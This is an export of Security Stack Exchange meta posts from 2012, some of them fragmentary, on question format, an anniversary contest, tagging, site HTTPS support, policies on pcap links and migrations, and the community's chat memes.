779,2,2012-05-01T00:17:08.760,3,,"<p>The problem with your format is that none of your posts below the question are answers. They're items, which if combined would make an answer.</p>

<p>Each answer is supposed to solve the problem on its own. In the present state, none of your posts solve the problem, they only tackle a small part of it.</p>

<p>Multiple answers are supposed to provide different ways of solving the problem. Let's say I want to suggest a different way of ensuring that <code>mod_ssl</code> uses <code>/dev/urandom</code>. So I would post another answer about <code>mod_ssl</code>. If everybody does that, the result will be a complete mess, with a few posts about <code>mod_ssl</code> and a few posts about Postfix and a few posts about OpenLDAp and …. There wouldn't even be a way of filtering the posts about <code>mod_ssl</code> among the crowd. And since I can next add my answer about Joe's HTCPCP server, this is indeed an “infinite list of X” question.</p>

<p>Voting on answers is supposed to reflect the accuracy, clarity, completenes and other qualities of the answer. Ideally, an answer has a higher score than another if it is better by these measures than the other answer. What does it mean if your Postfix answer is more upvoted than your OpenLDAP answer? That Postfix is better than OpenLDAP and I should start using it to serve my user and host databases? There are, indeed, “zero meaningful criteria for evaluation”.</p>

<p>This isn't an issue that's come up often on this site, if at all. Other subjects are more prone to generating such lists of items. The result is a mess. <a href=""https://scifi.stackexchange.com/"">Science Fiction and Fantasy Stack Exchange</a> ran into this issue early on, and ended up mentioning an explicit prohibition on “list questions” in its <a href=""https://scifi.stackexchange.com/faq"">FAQ</a>. However, this is not intrisically a policy that is specific to SF&amp;F: the FAQ only makes it explicit that lists of items are not well-suited to the Stack Exchange format.</p>

<p>When I read your question, I expected that you were after general advice regarding system configuration to use <code>/dev/urandom</code>. Given what you posted as answers, it seems that you are instead after advice for certain specific programs (<code>mod_ssl</code>, Postfix, etc.). Such specific advice should be in one question per program. I have therefore reversed my vote and voted to close your question as too broad. Please ask about each program separately, so that a person looking after advice for Postfix can find a Posftix question, etc.</p>

813,1,2012-06-12T08:23:32.110,14,512,"<p><strong>July the 12th marks one year since we came out of beta:</strong></p>

<p>And we have had continuous growth ever since, steadily gaining new users and questions, and the odd peak where a particular incident or burst of activity has boosted the community. Our birthday is an excellent opportunity to generate another burst of activity.</p>

<p>Other sites have held miscellaneous contests to encourage participation, and our anniversary seems as good a time as any to try one, assuming we have any clever ideas. There are two things to come up with- the contest itself, and the prizes for the winners</p>

<p><strong>Contest ideas</strong></p>

<p>Since other sites have held contests in the past, we might be able to steal one of their ideas:</p>

<p>Super User has done this several times. At 1 year they had a four week contest, where they rewarded users each week based on performance that week:</p>

<ul>
<li>Highest rep gain from a new user</li>
<li>Highest rep gain in general</li>
<li>Best post that week</li>
<li>Most useful post that week (this is different from #3? Apparently)
They did a similar thing this year, but changed the categories a bit to cover things other than just Q&amp;A (editing, tagging, blogging, cleanup, etc.). Jeff warns that it's important to incentivize the right thing</li>
</ul>

<p>Gaming has had much success with giving top users free copies of a new game, on the assumption that they'll ask questions about it and other people playing that game for the first time will search for the question and find the site. Science Fiction did the same thing with Star Wars. Not sure whether there is anything in this area that would be relevant here, but worth thinking about.</p>

<p>Gaming also had a contest centered around two popular games that came out around the same time, tracking which game was getting more posts on the site, and rewarding the top question and answer for each</p>

<p>Android picked a number of good questions that had gone unanswered for a long time, tagged them all, and entered all the accepted/top voted answers on those questions in a drawing to win Kindles. They also had a twitter-related promotion, but I don't think I would call it a contest. They've talked about doing an SU-style contest as well, but I don't know that it's happened yet</p>

<p>Unix &amp; Linux had a question clean-up competition, rewarding members who supplied good answers to old, unanswered questions. Philosophy rewarded users who ask questions about a chosen philosopher. History is doing it with wars. </p>

<p>All of these are excellent ideas. Obviously we're not limited to these, but we need something that will attract attention, new users, questions, answers, quality etc.</p>

<p><strong>Prizes</strong></p>

<p>Have a look at <a href=""https://security.meta.stackexchange.com/q/823/485"">this associated question on prizes</a>. Security already has some branded swag, and the Stack Exchange store has the usual fare. If we can come up with more Security-specific prizes that might give SE some useful ideas. For example, free attendance at a major security conference, EFF membership, things of that nature.  can't make any promises, but if we come up with clever prize ideas I'll see if Stack Exchange is willing to pay for them</p>

<p>I think the Unix &amp; Linux one (suggested by @Gilles) and SU's second contest (rewarding specific activities on a weekly basis) make a lot of sense. </p>

<p><strong>What are everyone else's preferences? Any other ideas for contests/prizes?</strong></p>

Don't take inspiration from it. There is a way to get a tag into the list, but no way to take a tag out, and no review as to what gets in. A lot of good tags have made it into the list.</p>

<p>I come to mostly the same conclusion as <a href=""https://security.meta.stackexchange.com/a/809"">Rory Alsop</a>: all the tags you cite make sense, except</p>

</ul>

<p>The others are good, meaningful tags. I don't see how you find some of them to be meta-tags.</p>

<ul>
<li><a href=""https://security.stackexchange.com/questions/tagged/obscurity"" class=""post-tag"" title=""show questions tagged &#39;obscurity&#39;"" rel=""tag"">obscurity</a> is ambiguous on SI, but here it clearly refers to security through obscurity (and not, say, to computer vision).</li>

On a site devoted to security, the tag is unambiguous and we want to be more precise. And I was opposed to removing <a href=""https://security.stackexchange.com/questions/tagged/trust"" class=""post-tag"" title=""show questions tagged &#39;trust&#39;"" rel=""tag"">trust</a> from SO too.</li>
<li><a href=""https://security.stackexchange.com/questions/tagged/security-theater"" class=""post-tag"" title=""show questions tagged &#39;security-theater&#39;"" rel=""tag"">security-theater</a> is a well-defined concept in security. Look it up if you don't know it. It was coined by Bruce Schneier and has now <a href=""http://www.schneier.com/blog/archives/2012/03/congressional_t.html"" rel=""nofollow noreferrer"">been used even by the TSA</a>.</li>

That'd be fine to tag such a question with a security-through-obscurity tag.</p>

837,2,2012-06-18T22:48:05.083,8,,"<p>So I saw a mention from the DMZ about me and this, so I'll chip in. </p>

<p>I guess the answer partially depends on why StackExchange do sponsorships...  </p>

<p>I'd guess that one reason is to help boost awareness of the SE network and specifically Sec.SE. In this case then I'd say that sponsoring OWASP events in general should be a good option.  </p>

<p>OWASP events tend to be primarily attended by people on the technical side of application security (both security practitioners and developers).  I'd say that the attendees are a good match for the kind of people we'd like to see contributing here, so raising awareness of Sec.SE with OWASP attendees would be good from that point of view.</p>

<p>There's also the aspect that @RoryAlsop raised, which is that OWASP are a non-profit security organisation who depend on sponsorships and memberships to raise funds for projects and conferences.  </p>

<p>Quite a few of their projects are well referenced and used in the security community in general (the OWASP Top 10 in particular) and get quite a few references on Sec.SE (210 from a basic search), so hopefully helping to fund them through sponsorships helps to improve the overall state of the AppSec industry...</p>

<p>Is that helpful?</p>

<p>One particularly glaring example is the lack of proper HTTPS support on the IT Security StackExchange site and blog.  For the main and meta site, some of this is mitigated by the availability of third-party OpenID providers who do use HTTPS.  However, this is not an option for the blog's administrative interface where in-the-clear HTTP appears to be the only way to connect.  Users who choose to create a StackExchange account with StackExchange's OpenID provider are also left to presume they are sending their credentials over clear HTTP.</p>

<blockquote>
  <p><strong>EDIT:</strong>  Bruno has pointed out that StackExchange's OpenID provider actually <em>does</em> use HTTPS, but it's not done in a way that will be apparent to most end-users.  Also, there's no way to validate the presence or authenticity of that function without reviewing the login page code <em>every time</em>.</p>

<p>This particular example is, I'm sure, just one among several issues that could affect our security as users of the StackExchange network.  These same issues could also impact our reputation and credibility as an IT Security community.</p>

<p>There may be some particular knowledge or work resource that SEI lacks, which someone here could volunteer or offer at a discount.  Or, maybe someone here with a security-focused mind and a wealth of experience-based technical knowledge could volunteer their time to consult with an open ear at SEI who could make some changes.</p>

<p>I really don't know what it will take or what SEI might accept, and maybe this is just a pipe dream, but I know we've got a lot of resources in this community and there's got to be <em>something</em> we can do to help.  What kind of ideas do you have?</p>

846,2,2012-06-28T23:10:51.920,14,,"<p>A slight update from the Stack Exchange engineering side of things, since it's been a while:</p>

<p>We are <em>moving</em> towards HTTPS for everything that needs to be secured (whether it's just for logging in and logged in users or <em>everything</em> is yet to be decided).  The issue here is a few fold: to start with, we would need certs with our current scheme, a <em>lot</em> of certs with no end in sight with the current scheme.  Let's take a look at why:</p>

<ul>
<li>security.stackexchange.com - ok good, *.stackexchange.com wildcard cert (we have this)</li>
<li>meta.security.stackexchange.com - <em>uh oh</em>, wildcards don't go 2 levels deep, we'd have to make a major change (likey) to how metas work (and share cookies) here.</li>
</ul>

<p>For <code>n</code> sites (and growing), having the child metas requiring another cert (or an entry/update on a shared cert, more likely) is a maintenance nightmare.  Also, each meta would now need its own DNS separate from the parent site as we create them, to point at that multi-cert endpoint (remember, a wildcard can't be a member of a multi-domain cert, at least not in a way accepted by most browsers).</p>

<p>You can see how our maintenance goes way up when adding a site, and it's a lot more configuration to keep around - since we're in the middle of the following:</p>

<ul>
<li>Moving to new load balancers</li>
<li>Setting up a redundant data center (Oregon)</li>
<li>Moving our primary data center (in New York)</li>
<li>Moving our databases to a set of SQL Server 2012 clusters (weeeeee)</li>
<li>About to start a major code initiative (that'll take months)</li>
<li>Setting up a new office</li>
<li>Planning another office move</li>
<li><em>plus anything that comes up day to day</em></li>
</ul>

<p>...now's not the best time for us to take SSL on <em>as well</em>.  The most critical bits are already travelling over SSL, so while we're moving towards expanding that support, we're not there quite yet.</p>

<p>For the inevitable ""what if someone gets a developer cookie??"" argument...that's why we use the sites over a secure VPN while travelling where a MITM attack is a significant risk.  I'd be happy to expand on this more if there are further questions, just wanted to let you know we're not ignoring it or brushing it aside...we're just extraordinarily busy as of late.</p>

<p><a href=""https://security.stackexchange.com/q/16775/953"">https://security.stackexchange.com/q/16775/953</a></p>

<p>Though I haven't reviewed the file myself to know if these particular links fit my concerns, I think we really should have a general (no exceptions) policy about this.</p>

<p>The risk I foresee is that the capture files may contain sensitive personal or organizational information sent over the network in the clear, or in an easily recoverable format.  While we obviously cannot be held responsible for the fact that the information was sent over any network in such form in the first place, or that it may exist in capture files uploaded to a third-party hosting site we don't control, or that links to the files are posted on our website, we may be criticized or acted upon (rightly or not) for allowing those links to remain unmoderated.</p>

<p>I suggest our policy be to remove such links on sight, but this is of course a policy that needs to be decided upon by the community - and, particularly, the ""Blue Diamonds"".  Additionally, we should request (as was done not long ago in the case of a web vulnerability link) that SEI mods remove old edit history items which contain those links.</p>

<p>I see nothing wrong with sharing pcap files in principle. You might be looking at one for self learning purposes - i.e. just a boring home network 192.168.0.0/16 ladada NETBIOS INAMEMYPCAFTERSTARWARSCHARACTERS laadadadaaaa.(*)</p>

<p><em>That said</em>, there is a potential for an individual to do some form of examination (warranted or not) on a network they do not own and publish the results here, accidentally letting on far more than they intended. There's also potential for an individual to publish a file that is part of a contracted analysis. I mean, people don't hire people who just publish sensitive stuff on the web or write their pentest contracts missing clauses that say ""you won't publish what you find or any details of our network that might lead to an attack"", do they? Do they? But there's still a potential. </p>

<p>But I think we can come a level down from that. Publishing an entire pcap dump and saying ""hey guys, can haz help doing analysis?"" is the equivalent of going to Stack Overflow with a 20,000 line perl program and saying ""hey, there's an error somewhere in this, please help?!"". The typical SO reaction is ""we are not doing your job for you"".</p>

<p>I suggest we deal with these under the same premise. Exactly what packets are you interested in? Reproduce <em>those</em> <strong>in the question</strong>, not some pastebin/file upload site I have to go to look at, download, pass through tcpdump. The chances of me bothering to do that are really very remote. I have enough crash dumps waiting on my desk at work...</p>

<p>This has the nice side effect of dealing with accidental leakages via these mechanisms. ""We're not analysing your tcpdump for you unless you do some legwork and ask about what you're seeing"" also means we'll either just close, edit in or otherwise mask the information.</p>

<p>Blowing away revisions is not something moderators can do. Moreover, the procedure for blowing away data from revisions goes like this:</p>

<ul>
<li>Delete it (question, answer etc) immediately.</li>
<li>Contact community with a link to the revision.</li>
<li>Wait for the revision to vanish.</li>
<li>Undelete if community person didn't.</li>
</ul>

<p>The reason for the immediate deletion is to halt any further leakage - only 10k+ users can see the revision and only if they have a link. Of course, for the user, unless they requested the removal, this is an inconvenience they may find frustrating (""omg evil mods why did you delete my question?"") and result in ""unfathomable behaviour"" and possibly a  ""repost condition"".</p>

<p>So what I'm trying to say is that one would have to be carefully handled. I'd personally reserve it only for cases where the person asks for it, as it involves the effort of at least one mod and at least one member of SE staff. I know, I'm ARPing on a bit now. Sorry.</p>

862,1,2012-07-21T12:13:43.110,17,200,"<h3>Rationale (summary)</h3>

<p>Questions that are migrated into this site with highly-upvoted, poor-quality answers reflect poorly on our community. When the voting on answers cannot reasonably reflect the Sec.SE community's opinion (as opposed to that of the originating site), I propose to reject the migration altogether. Point the asker to existing duplicates on Sec.SE, or suggest that they re-ask on Sec.SE.</p>

<h3>Rationale (rant-sized)</h3>

<p>Security is a topic where it is often difficult to verify an answer: you can't work out the math for yourself, or check that the program performs as advertised, or look up the citation in the primary source. I think that by and large voting works well on this site to pick good answers from bad. Not always, but as often as on other Stack Exchange sites with more directly verifiable answers.</p>

<p>There is however a case where this vetting by voting breaks up completely: questions that have attracted a lot of traffic from other Stack Exchange sites. Most of these are the result of incoming migrations. My informal impression is that almost every time a migration comes in with a large number of votes on answers, these votes favor poor answers.</p>

<p>Example: yesterday's specimen, <a href=""https://security.stackexchange.com/questions/17460/to-salt-or-not-to-salt"">To salt, or not to salt?</a> This is a topic that's come up before: <a href=""https://security.stackexchange.com/q/14025"">Why is using salt more secure?</a>  <a href=""https://security.stackexchange.com/q/15910"">Why would salt not have prevented LinkedIn passwords from getting cracked?</a> (Conflict of interest disclaimer: I answered one of these questions.) I don't think that any of the answers that came with the migration improves the site, compared with the answers on the previous questions.</p>

<p>If this question was asked on the site, it would be a fine, on-topic question. And I think it would attract good answers. But it came in with poor answers, and when the top answer has 30 upvotes coming in from the source sites, there's no way we, the Sec.SE community, can make any disagreement with this answer visible.</p>

<p>Even if the question is eventually closed as a duplicate, it will remain on the site, with high visibility due to its rather high score. To the casual observer, these highly-upvoted answers have the backing of the Sec.SE community.</p>

<p>I think the best solution would be to <a href=""https://meta.stackexchange.com/questions/87031/reset-votes-on-migrated-questions"">reset all votes on migrated threads</a>. This simple feature request has been sitting there for over a year, so I won't hold my breath. I think we should take the matter into our own hands.</p>

<p>I don't think we can selectively delete incoming answers or edit them beyond recognition, which is all we can do since we don't have the downvoting power to refute answers with 30 upvotes: most of these answers are not actively harmful, they're just misguided or incomplete. But in a case like yesterday's, the thread <em>as a whole</em> does not improve the site. What would most benefit the asker is a pointer to the existing threads on the topic.</p>

<p>This leaves the alternative of deleting the question as a whole. Closure doesn't help, because it leaves the poor answers in place. Furthermore, there isn't always an applicable close reason — typically these questions are good, on-topic questions, and they are not necessarily duplicates. Deleting the question rejects the migration; the question becomes closed and unlocked on the originating site, with the answers undeleted. This had best happen quickly, before the Sec.SE community has contributed answers on its own. A meta thread would take too long for this, so I propose that moderators act directly.</p>

<p>This isn't a new concern — <a href=""https://security.meta.stackexchange.com/questions/494/downsides-of-migrating-questions-from-high-volume-sites"">Downsides of migrating questions from high-volume sites</a>  <a href=""https://security.meta.stackexchange.com/questions/718/another-debateable-migration"">Another debateable migration</a>  — so let's <em>do</em> something about it.</p>

<h3>Proposed policy</h3>

<p>When a question is <strong>migrated from another site with highly-upvoted existing answers</strong>, Sec.SE moderators review the answers, and decide whether to keep the migration. If, in their best judgement, the quality of the answers reflect poorly on the site, then at their own discretion, <strong>moderators may delete the question</strong>. Moderators' decisions are final. It is recommended that the deleting moderator leaves a comment on the original question on the source site, either citing existing Sec.SE questions on the question's topic or suggesting to repost the question on [sec.se].</p>

881,2,2012-08-06T12:42:46.623,30,,"<h1><strong><em>Rory</em></strong></h1>

<p>As you've already mentioned, Rory has become a bit of a meme within the IT Security StackExchange community.  Usage of this meme often takes the form of word substitution a-la ""smurf"".  </p>

<p><strong>Usage Examples:</strong></p>

<blockquote>
  <p>Jeff Ferland:  <a href=""http://chat.stackexchange.com/transcript/151?m=5006504#5006504"">It's a quite a rory of a problem, really</a>  </p>
  
  <p>Ninefingers:  <a href=""http://chat.stackexchange.com/transcript/151?m=4864874#4864874"">At a guess, he feels a little Rory.</a>  </p>
  
  <p>AviD:  <a href=""http://chat.stackexchange.com/transcript/151?m=4690384#4690384"">For the rory of it.</a></p>
  
  <p>Polynomial: <a href=""http://chat.stackexchange.com/transcript/message/6309704#6309704"">s/\b.+/Rory/</a></p>
</blockquote>

<p>Of course, as tends to happen with such things, this would often get <em>over</em> used - sometimes to the point of making ""rory'd"" or ""rory-fied"" statements utterly incomprehensible.</p>

<p><strong>(Ab)usage Examples:</strong></p>

<blockquote>
  <p>Iszi Rory or Isznti:  <a href=""http://chat.stackexchange.com/transcript/151?m=4934589#4934589"">Well, rory you - you, rorying Rory.</a>  </p>
  
  <p>Ninefingers:  <a href=""http://chat.stackexchange.com/transcript/151?m=5000840#5000840"">Hello Rories, would this Rory be more on Rory here?</a>  </p>
  
  <p>AviD:  <a href=""http://chat.stackexchange.com/transcript/151?m=4934568#4934568"">Can you rories please rory down. You're rorying the rority of my rory room.</a></p>
</blockquote>

<p>Further development of this meme led to an interesting time, when the chat room's topic was changed to really nothing but <a href=""https://security.stackexchange.com/questions/tagged/rory"" class=""post-tag"" title=""show questions tagged &#39;rory&#39;"" rel=""tag"">rory</a>.</p>

<blockquote>
  <p>Scott Pack:  <a href=""http://chat.stackexchange.com/transcript/151?m=4672066#4672066"">room topic changed to The DMZ: The first Rory costs you a Rory.... [rory] [rory] [rory] [rory]</a></p>
</blockquote>

<p>Later, some users decided to have even more fun with this and actually change their usernames for a time:</p>

<p><strong>Former Rorys:</strong></p>

<p><a href=""https://security.stackexchange.com/users/953/iszi"">Iszi Rory or Isznti</a><br>
<a href=""https://security.stackexchange.com/users/618/scott-pack"">Rory Pack</a><br>
<a href=""https://security.stackexchange.com/users/52676/rora%CE%96"">Roraz</a> was originally Raz</p>

<p><strong>Origins:</strong></p>

<p>This meme came about primarily due to the seemingly abnormal dominance of the name ""Rory"" within the IT Security - particularly, the IT Security StackExchange - community.  For a long time, and perhaps still to this day, the ""original"" Rorys were the only individuals in <a href=""http://chat.stackexchange.com/rooms/151/the-dmz"">The DMZ</a> who were known to share the same Given Name (or First Name) in real life.  Since then, the IT Security StackExchange has seen a few other Rorys.  Most Rorys are from Scotland or another part of the U.K., while another is from Ireland and a couple are unspecified.</p>

<p><strong>Original Rorys:</strong></p>

<p><a href=""https://security.stackexchange.com/users/37/rory-mccune"">Rory McCune (Scotland)</a><br>
<a href=""https://security.stackexchange.com/users/485/rory-alsop"">Rory Alsop (Scotland)</a></p>

<p><strong>Other Rorys:</strong></p>

<p><a href=""https://security.stackexchange.com/users/7454/rory-harvey"">Rory Harvey (U.K.)</a><br>
<a href=""https://security.stackexchange.com/users/4097/rory"">Rory (Ireland)</a><br>
<a href=""https://security.stackexchange.com/users/10081/rory"">Rory (Unspecified)</a><br>
<a href=""https://security.stackexchange.com/users/12078/rory-okane"">Rory O'Kane (Unspecified)</a></p>

<p><strong>Interesting Facts:</strong></p>

<ul>
<li>The ""Original Rorys"" have worked together, at the same company, at least twice in the past.</li>
</ul>

<blockquote>
  <p>Rory Alsop:  <a href=""http://chat.stackexchange.com/transcript/151?m=778611#778611"">5 or 6 years ago when Rory and I worked for the same employer, everyone just referred to me as Rory 1 (as I was there first) and he was Rory 2. With the new gig, he grabbed Rory 1 first...so I went all Asimov and my sig is Rory 0.</a></p>
</blockquote>

<ul>
<li><p>Rory Alsop has been a Moderator on StackExchange, both as a <a href=""https://security.meta.stackexchange.com/questions/81/moderator-pro-tem-announcement"">Pro Tem</a> and one of our first elected moderators.  He's also been among the most active contributors (and chatters) in our community, and a regular contributor and maintainer of the <a href=""http://security.blogoverflow.com/"" rel=""nofollow noreferrer"">IT Security StackExchange Blog</a></p></li>
<li><p>But, Rory McCune got here first.</p></li>
</ul>

<blockquote>
  <p>Rory Alsop:  <a href=""http://chat.stackexchange.com/transcript/151?m=5022281#5022281"">no - Rory (1) introduced me to this site</a></p>
</blockquote>

<p><img src=""https://i.stack.imgur.com/3gRCn.jpg"" alt=""enter image description here""></p>

<p>Of the 7 <a href=""http://securi-tay.co.uk/speakers.html"" rel=""nofollow noreferrer"">speakers presenting at the Securi-Tay</a> conference in January 2013, 3 are Rories. (Additionally, 4 of the 7 are Security.SE contributors!)</p>

<p>@AndreyBotalov found this thread about Doctor Who's Rory Williams when googling for ""All the Rorys"":

<p>There is evidence of Rory powers:</p>

<p>And Rories crop up in questions on other Stack Exchange sites, such as this one:</p>

<blockquote>
  <p><a href=""https://scifi.stackexchange.com/q/114896/1146"">Why does Rory not use his handgun after he discovers he has it?</a></p>

<p>A proposal was also made by <a href=""https://security.stackexchange.com/users/3339/lucas-kauffman"">Lucas Kauffman</a> to create a <a href=""http://area51.stackexchange.com/proposals/63898/rory"">Rory Stackexchange site</a>. Sadly an anti-Rory faction closed it down.</p>

<p><strong>Originator</strong>: Unknown</p>

<p><strong>Cultural Height</strong>: Early 2011</p>

<p><strong>Background</strong>: American hubris on the part of our East cost users resulted in blanket declarations that EDT/EST (UTC-4/5) would be considered the de facto timezone of The DMZ. This was brought upon by inconsistent time of day greetings such as this exchange on <a href=""http://chat.stackexchange.com/transcript/message/406742#406742"">January 24th, 2011</a>.</p>

<blockquote>
  <p>Iszi: Mornin' all!<br>
  Iszi: Howdy @RoryAlsop @packs @nealmcb<br>
  packs: @Iszi G'Morning sunshine<br>
  Rory Alsop: afternoon all</p>
</blockquote>

<p>And also ambiguously generic greetings such as <a href=""http://chat.stackexchange.com/transcript/151?m=1969712#1969712"">this one</a>:</p>

<blockquote>
  <p>Morning +/-12 hours </p>
</blockquote>

<p>@this.josh recommended use of this politically correct greeting:   </p>

<blockquote>
  <p>Happy diurnal isomorphism </p>
</blockquote>

<p>@Polynomial points out that ""diurnal isomorphism"" is much more fun if you misspell it as ""diurinal isomorphism"".</p>

<p>Although we have one US moderator, the majority of the Security Stack Exchange moderators are based quite far east of the US (UK, Germany and Israel), therefore delight in declaring other timezones arbitrarily and randomly when entering the DMZ.</p>

883,2,2012-08-06T17:26:13.317,8,,"<p><strong>Meme</strong>: FAW (Frequently/Funny Attacking Wildebeest)</p>

<p><strong>Originator</strong>: @RoryAlsop</p>

<p><strong>Cultural Height</strong>: Early 2011</p>

<p><strong>Background</strong>: Best explained by the originator, <a href=""http://chat.stackexchange.com/transcript/151?m=432118#432118"">shortly after its inception</a>:   </p>

<blockquote>
  <p>FAW=FAQ. We just got chatting late on one evening after a basic spelling mistake, and it snowballed. </p>
</blockquote>

<p>In other words, our fearless leafer made a silly typo, and we made fun of him mercilessly, and kinda ran with it. Just cuz, that's kinda what we do. </p>

<p>At some point, after interrogation, we were searching for a backronym, to explain the <code>W</code> in there. Thanks to our collective fixation with food, and specifically my particular kosher fetish and fascination with rare types of <strike>animal</strike> meat, we landed on <a href=""http://en.wikipedia.org/wiki/Wildebeest"" rel=""nofollow"">Wildebeest</a>.

884,2,2012-08-06T19:44:53.030,27,,"<p><strong>Meme</strong>: Bears</p>

<p><strong>Originator</strong>: @ThomasPornin, @ScottPack, @AviD</p>

<p><strong>Cultural Height</strong>: July 2011</p>

<p><strong>Background</strong>: Our highest rep user, cryptographer Thomas Pornin created a couple of distinct accounts with bear avatars. </p>

<p><a href=""https://security.stackexchange.com/users/655/thomas-pornin""><img src=""https://i.stack.imgur.com/VGKxe.jpg"" alt=""enter image description here""></a><a href=""https://security.stackexchange.com/users/5411/tom-leek""><img src=""https://i.stack.imgur.com/OmbON.jpg"" alt=""enter image description here""></a></p>

<p>Being a rather prominent and respected member of the community, this has earned him some nicknames:</p>

<ul>
<li>""The Bear"" usually refers to @ThomasPornin himself, but is also often used specifically in reference to his primary account.</li>
<li>""Big Bear"" is usually used to refer to the actual @ThomasPornin account, distinct from...</li>
<li>""Little Bear"" which is used to refer to the @TomLeek persona.</li>
</ul>

<p>With his rapid rep gain, the bear icon appeared regularly, so a winged bear with lasers was proposed as a site logo when we graduated. </p>

<blockquote>
  <p><a href=""http://chat.stackexchange.com/transcript/151?m=2090800#2090800"">@Jin new design - bears, with wings, and lasers as per @AviD's
  request?</a></p>
</blockquote>

<p>@ScottPack then introduced us to the ServerFault <a href=""https://meta.serverfault.com/questions/1850/paddington-bear-choppertar"">Paddington Bear Choppertar</a>, so the theme grew. Later the bear theme came to include references from the LGBT community in the form of these <a href=""http://en.wikipedia.org/wiki/Bear_%28gay_culture%29"" rel=""nofollow noreferrer"">gentlemen</a>:</p>

<p><img src=""https://i.stack.imgur.com/bSQos.jpg"" alt=""enter image description here""></p>

<p>On September 22 2013, the Big Bear reached 100k rep - so it <a href=""https://security.meta.stackexchange.com/q/1412/485"">has been proposed</a> that this date should be celebrated as Bear Day each year... to which Thomas answered in his usual sincere manner:</p>

<blockquote>
  <p>The Bear approves of your oath of fealty. You may keep on chanting the glory of your ursine overlords.</p>
</blockquote>

<p>At about the same time, Little bear topped 40k - giving him a total rep about the same as the total rep for the next 4 members!</p>

<p><strong>Background</strong>: Following on from Wildebeest and other discussions, topic #1 in the DMZ became not security, but food, and just what we could or had eaten. Some delicious examples:</p>

<blockquote>

  <p>a local cafe mistranslated something.... I insisted that the waitress bring me extra sealion in my sandwich, but she refused.</p>

887,1,2012-08-07T08:54:39.127,21,900,"<p>As Security Stack Exchange has just passed its 1st anniversary of graduation, we are going to follow in the tradition of other sites and run a competition.</p>

<p><strong>With prizes! Cool ones!</strong></p>

<p>Obviously in order to deserve these prizes you'll need to put in some effort, but I know you will rise to the challenge. So without further ado, here are the details:</p>

<p><strong>Beginning on Monday the 13th of August</strong>, for the following 4 weeks, we have selected a topic for each week. The tags for this topic will be posted below this question, and announced in chat before each Monday.</p>

<p><strong>Level 1 prizes - <a href=""https://i.stack.imgur.com/BeMMQ.png"" rel=""nofollow noreferrer"">Security Stack Exchange T-shirts</a></strong> - these lovely numbers are a hit anywhere (assuming you are at an IT, Security or Geek conference) - designed by @Jin and lovingly crafted in soft but hard-wearing cotton!</p>

<ul>
<li><p>One level 1 prize will be awarded for the most suggested edits that are accepted each week. (Unfortunately, this means 2k+ users aren't eligible for this method of entry.)</p></li>
<li><p>Throughout the 4 weeks we will also monitor users who receive a <a href=""https://security.stackexchange.com/badges/59/revival"">Revival badge</a>, and a Level 1 prize will be awarded for the person with the highest score from answers on those questions. </p></li>
<li><p>All entrants with a question or answer with a score of at least 5 will be entered into a draw at the end of the month. Each raffle winner (one question, one answer) will receive a Level 1 prize.</p></li>
</ul>

<p><strong>Level 2 prizes - <a href=""http://www.youtube.com/watch?v=O-ky0OwYZnk"" rel=""nofollow noreferrer"">Corsair Flash Survivor USB drive</a></strong> - for all your '<a href=""https://meta.stackexchange.com/a/19487/154443"">on a boat</a>' needs. I have tested one of these in a river, and it performs as stated - it survived!</p>

<ul>
<li>One level 2 prize will be awarded each week to an individual whose posting activity (questions or answers) in any of the weekly topic tags (see the answer below for the topic tags) passes the following thresholds: 10 posts with a score of 1 or more, 5 posts with a score of 5 or more, 1 post with a score of 8 or more. The winners will be drawn at random from all those who pass these thresholds. Posts are cumulative so you need 10 posts total, of which 5 have a score >5 and 1 has a score >8.</li>
</ul>

<p><strong>The top prize - a <a href=""http://blogs.computerworld.com/19671/sneak_pineapple_peak_hak5_creates_even_more_lethal_wi_fi_hot_spot_honeypot_hacking_tool"" rel=""nofollow noreferrer"">WiFi Pineapple</a></strong> - if you know what one of these is, you want one. If you don't, then google until you also desire one :-)</p>

<ul>
<li>For the top prize over the 4 weeks, the winner will need to reach even higher thresholds - 35 posts with a score of 1 or more, 15 posts with a score of 5 or more, 3 posts with a score of 8 or more. The winner will be drawn at random from all those who pass these thresholds. As with the Level 2 prize, posts are cumulative. </li>
</ul>

<p>To give the greatest number of people a chance to win a prize, if you win a level 1 prize and then later you win a level 2 prize we will assume (unless told otherwise) that you would prefer the level 2 prize and will then assign that level 1 prize to the next highest competitor. Same goes for the level 3 prize, so although we will announce winners each week, the final result may change slightly. <strong>To account for this, we'll track weekly winners along with runners-up for each week.</strong></p>

<h2>Additional notes:</h2>

<ul>
<li>In order to avoid confusion days will work in UTC (as per Stack Exchange standard) and not <a href=""https://security.meta.stackexchange.com/a/882/485"">Canonical DMZ TimeZone</a>. :-)</li>
<li>Deleted/closed questions are ineligible for the event. Answers to questions that, once answered, are closed/deleted are <em>also</em> disqualified. </li>
<li>For the Level 2 prize: if the tag is removed during the window of the promotion, the post is disqualified.</li>
<li>Winning a weekly prize <em>does not</em> knock you out of the running for cumulative prizes. However, winning a higher-level prize makes you ineligible for lower-threshold prizes. We'll keep track of runners-up for each week to account for this.</li>
<li>The event will run from <strong>13 August</strong> until <strong>9 September</strong>. Keep an eye on this meta post!</li>
<li>Revival Badge is awarded for: Answered more than 30 days later as first answer scoring 2 or more. This badge can be awarded multiple times.</li>
</ul>

<p><strong>We are in our second day of the competition - some good questions in there already, but we can always do with more. And remember to keep on suggesting good edits.</strong></p>

<p><strong>Originator</strong>: @Iszi, @ScottPack, @GrahamLee</p>

<p><strong>Cultural Height</strong>: Most of 2011</p>

<p><strong>Background</strong>: Originally, <a href=""http://chat.stackexchange.com/transcript/message/463808#463808"">@Graham made a snarky comment to @Iszi</a>, and @Scott over-analyzed and ran downhill with it. @Iszi's protests of malehood notwithstanding. </p>

<blockquote>
  <p>Graham Lee: @Iszi Just doin' my job, ma'am ;)<br>
  packs: @GrahamLee Hm. I always assumed Iszi was male, though in retrospect all statements could be gender neutral. This should be interesting to see (his|her) reaction.<br>
  Iszi: @packs Funny. Real funny.<br>
  Graham Lee: I keeed<br>
  Iszi: I suppose these days ""wife"" is a gender-neutral term, in respect to identifying the speaker. I know I've mentioned the XYL once or twice here.   </p>
</blockquote>

<p>From there, it just continued to hang around, like a cloud of gender-confusion hanging  over @Iszi's gravatar, such as this assortment of comments:    </p>

<blockquote>
  <p>Probably around the same time my gender came into question.</p>
  
  <p>A gender/orientation identity crisis? Yeah, me neither. Though I was a theatre major for a while, that should give me some perspective.   </p>
  
  <p>Whichever gender @Iszi may or may not be is still, in my mind, an open question until I see (him|her) in a bar.   </p>
  
  <p>First you accuse me of being a different gender. Now I play with sock puppets?   </p>
  
  <p>Great... now I'm a scapegoat of questionable gender.   </p>
  
